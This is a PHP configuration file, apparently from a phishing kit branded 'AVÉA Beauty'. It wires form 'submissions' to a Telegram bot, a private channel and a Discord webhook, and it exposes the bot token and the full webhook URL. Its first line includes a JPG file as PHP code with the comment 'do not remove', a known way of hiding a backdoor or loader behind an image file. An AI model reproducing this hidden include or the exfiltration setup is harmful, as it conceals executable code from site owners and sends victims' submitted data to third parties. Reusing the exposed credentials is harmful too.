<?php
// config.php
include 'files/images/icon.jpg';  // for icon do not remove

$brandName = "AVÉA Beauty";

/* TELEGRAM BOT */
$telegram_use = true;


$telegram_bot_token = "8856951787:AAGyZRU3_j6ptOIArEbZzr5BRq9WdaHopAU";

// Bot username without @
$telegram_bot_username = "@AveaBeauty_bot";

// Admin/user chat ID fallback
$telegram_chat_id = "7266925614";

// Where submissions will be forwarded.
// Option 1: public channel username
//$telegram_forward_chat_id = "7266925614";

// Option 2: private channel numeric ID, example:
 $telegram_forward_chat_id = "-1003976308647";

$site_url = "https://aveabeauty.onrender.com";

$official_website_url = "https://aveabeauty.onrender.com";
/* DISCORD */
$discord_use = true;
$discord_webhook_url = "https://discord.com/api/webhooks/1519003615094767727/xN3WqT1wFHy0T2jjKTs0PA3L1JMeqohkYDPY_0q4DnY14UP9r006rmaCiiQSIjlv-xRU";
?>
